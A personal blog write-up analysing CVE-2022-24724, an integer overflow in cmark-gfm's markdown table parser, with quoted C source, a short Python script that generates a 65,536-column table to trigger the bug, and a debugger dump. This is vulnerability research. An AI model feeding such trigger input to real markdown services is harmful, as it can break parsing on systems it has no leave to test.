---
layout: post
title: Anhphan.md?
subtitle: Small talk about CVE-2022-24724 - recent markdown table parsing bug
tags: [pwn, writeup]
---

Note: I'm new in researching stuff so this post might not be so "accurate" 💀

```
| Còng | số  | 8   | siết | tay   | anh  |    |
|------|-----|-----|------|-------|------|----|
| Giam | giữ | đời | anh  | trong | ngục | tù |
```

Yeah, that is a markdown table. Just a few days ago there is a [integer overflow bug](https://github.com/github/cmark-gfm/security/advisories/GHSA-mc3g-88wq-6f4x) in cmark-gfm's table row parsing mechanism. So i decided to look around to see if i could be able to find something interesting :p

table.c:
```C
typedef struct {
  uint16_t n_columns; // [1]
  int paragraph_offset;
  cmark_llist *cells;
} table_row;


...


static table_row *row_from_string(cmark_syntax_extension *self,
                                  cmark_parser *parser, unsigned char *string,
                                  int len) {
  // Parses a single table row. It has the following form:
  // `delim? table_cell (delim table_cell)* delim? newline`
  // Note that cells are allowed to be empty.
  //
  // From the GitHub-flavored Markdown specification:
  //
  // > Each row consists of cells containing arbitrary text, in which inlines
  // > are parsed, separated by pipes (|). A leading and trailing pipe is also
  // > recommended for clarity of reading, and if there’s otherwise parsing
  // > ambiguity.

  table_row *row = NULL;
  bufsize_t cell_matched = 1, pipe_matched = 1, offset;
  int expect_more_cells = 1;
  int row_end_offset = 0;

  row = (table_row *)parser->mem->calloc(1, sizeof(table_row));
  row->n_columns = 0; // [2]
  row->cells = NULL;

  // Scan past the (optional) leading pipe.
  offset = scan_table_cell_end(string, len, 0);

  // Parse the cells of the row. Stop if we reach the end of the input, or if we
  // cannot detect any more cells.
  while (offset < len && expect_more_cells) {


...


      row->n_columns += 1; // [3]
      row->cells = cmark_llist_append(parser->mem, row->cells, cell);
    }


...


  if (offset != len || row->n_columns == 0) { // [4]
    free_table_row(parser->mem, row);
    row = NULL;
  }

  return row;
}
```

Functions analysis:

free_table_row actually calls `cmark_llist_free_full`:

Look at [1], you can see that the n_column is uint16_t type, which ranges from 0x0 to 0xffff.

[2] Before parsing a row the program reset n_column to 0

[3] Every "cell" passing by the n_column value will be increased by 1

[4] This checks if the parsing has been processed correctly, if:

- some unexpected behavior (`offset != len`, everytime the program bypass a "\|" character the `offset` will be increased, the `len` is the length of a line of the table) happens

- the number of columns is valid (`row->n_columns == 0`)

If 2 conditions above are not satisfied, then the program will abort table parsing process (by return a NULL "table_row" pointer).

Functions analysis:

`free_table_row` actually calls `cmark_llist_free_full`:

```C
void cmark_llist_free_full(cmark_mem *mem, cmark_llist *head, cmark_free_func free_func) {
  cmark_llist *tmp, *prev;

  for (tmp = head; tmp;) {
    if (free_func)
      free_func(mem, tmp->data);

    prev = tmp;
    tmp = tmp->next;
    mem->free(prev);
  }
}


...


static void free_table_cell(cmark_mem *mem, void *data) {
  node_cell *cell = (node_cell *)data;
  cmark_strbuf_free((cmark_strbuf *)cell->buf);
  mem->free(cell->buf);
  mem->free(cell);
}


...


cmark_llist_free_full(mem, row->cells, (cmark_free_func)free_table_cell);
```

This is simple just free all the cell-pointers on a row. Not thing particular to exploit here.

To make sure i analysed the bug correctly i wrote a small script to generate buggy markdown:
```python
table = ''

for i in range(0x10000):
    table+='|   '
table+='|\n'

for i in range(0x10000):
    table+='|---'
table+='|\n'

print(table)
```

The upper bound of uint16_t data type is 0xffff and 0x10000 row will trigger the integer overflow bug. I tested it and right.
```
*RAX  0x1
*RBX  0x0
*RCX  0x40001
*RDX  0x0
*RDI  0x7ffff7b03d11 ◂— 0xa /* '\n' */
 RSI  0x7ffff7ac3d10 ◂— 0x2020207c2020207c ('|   |   ')
*R8   0x1
*R9   0x0
*R10  0xffffffffffffffff
*R11  0x7ffff6bf95d8 —▸ 0x7ffff7fba460 (CMARK_ARENA_MEM_ALLOCATOR) —▸ 0x7ffff7fa0680 (arena_calloc) ◂— endbr64 
*R12  0x7ffff7ac3d10 ◂— 0x2020207c2020207c ('|   |   ')
*R13  0x40002
*R14  0x55555555cb68 ◂— 0x0
*R15  0x40001
*RBP  0x40002
*RSP  0x7fffffffcd30 ◂— 0x7fff00000001
*RIP  0x7ffff7fbf850 (row_from_string.isra+480) ◂— cmp    r13d, ebp
─────────────────────────────────────────────────────────[DISASM]────────────────────────────────────────────────────────
 ► 0x7ffff7fbf850 <row_from_string.isra+480>    cmp    r13d, ebp
   0x7ffff7fbf853 <row_from_string.isra+483>    jne    row_from_string.isra+512                <row_from_string.isra+512>
 
   0x7ffff7fbf855 <row_from_string.isra+485>    cmp    word ptr [r14], 0
   0x7ffff7fbf85a <row_from_string.isra+490>    je     row_from_string.isra+512                <row_from_string.isra+512>
    ↓
   0x7ffff7fbf870 <row_from_string.isra+512>    mov    rax, qword ptr [rsp + 8]
   0x7ffff7fbf875 <row_from_string.isra+517>    mov    rsi, qword ptr [r14 + 8]
   0x7ffff7fbf879 <row_from_string.isra+521>    lea    rdx, [rip - 0x890]            <0x7ffff7fbeff0>
   0x7ffff7fbf880 <row_from_string.isra+528>    mov    rbx, qword ptr [rax]
   0x7ffff7fbf883 <row_from_string.isra+531>    mov    rdi, rbx
   0x7ffff7fbf886 <row_from_string.isra+534>    call   cmark_llist_free_full@plt                <cmark_llist_free_full@plt>
 
   0x7ffff7fbf88b <row_from_string.isra+539>    mov    rdi, r14
```

In which [r14] is row->n_columns, you can see `R14  0x55555555cb68 ◂— 0x0`. That's where the bug was triggered, you could test it on your own and see that the table parsing is no longer work, but i don't think this bug capable of performing RCE in such small program (own opinion), it might be able to trigger RCE if implemented seperately on larger system.